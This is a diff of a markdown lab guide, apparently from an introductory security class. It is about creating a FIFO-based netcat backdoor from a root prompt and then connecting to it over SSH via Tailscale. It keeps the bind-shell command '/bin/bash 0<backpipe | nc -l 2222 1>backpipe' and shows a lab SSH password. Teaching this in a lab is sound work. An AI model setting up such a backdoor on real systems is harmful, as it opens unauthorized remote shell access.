@@ -54,14 +54,10 @@ This will get us to a root prompt. We want to do this in order to have a backdoo
 Next, we will need to create a **FIFO** backpipe:
 
 ```bash
-mknod backpipe p
+mkfifo backpipe
 ```
 
 Next, let's start the backdoor:
-
-```bash
-mkfifo backpipe
-```
 
 ```bash
 /bin/bash 0<backpipe | nc -l 2222 1>backpipe
@@ -73,17 +69,45 @@ On a more basic level, this will create a backdoor listening on port 2222 of our
 
 Now, let's open another **Linux** terminal.  This terminal will connect to the backdoor we just created.  
 
-You can do this by right clicking the icon on the desktop and selecting open...
 
-![](attachments/OpeningLinuxInstance.png)
 
-<b>Or...</b> you can simply click on the Linux logo in the taskbar.
 
-![](attachments/TaskbarLinuxIcon.png)
+
+- Open **Command Prompt**
+
+<img width="85" height="103" alt="image" src="https://github.com/user-attachments/assets/b2c7dbad-d57b-40d0-9318-ca8d40176c22" />
+
+- Get the IP of the other VM
+```bash
+tailscale status
+```
+
+<img width="740" height="75" alt="image" src="https://github.com/user-attachments/assets/8ec3aa43-15fc-4a2c-a1e4-5e0caa219ef5" />
+
+>[!IMPORTANT]
+>We are looking for the **linux** VM, so grab the IP from the **linux** line
+>
+>For us it is `100.116.161.87`, **YOUR IP MAY BE DIFFERENT, USE YOURS**
+
+- **SSH** into that machine
+```bash
+ssh ubuntu@100.116.161.87
+```
+
+Password is `metarange`
+
+<img width="247" height="25" alt="image" src="https://github.com/user-attachments/assets/69706053-abe6-4de7-aa48-d9fd739ec4a7" />
+
+
+
+
+
 
 Now we will need to know the IP address of our **Linux** system:
 
-<pre>ifconfig</pre>
+```bash
+ifconfig
+```
 
 ![](attachments/ifconfigLinuxInstance.png)
 
@@ -198,6 +222,7 @@ Please be sure to destroy the lab environment!
 [Click here for instructions on how to destroy the Lab Environment](/IntroClassFiles/Tools/IntroClass/LabDestruction/labdestruction.md)
 
 ---
+
 
 
 
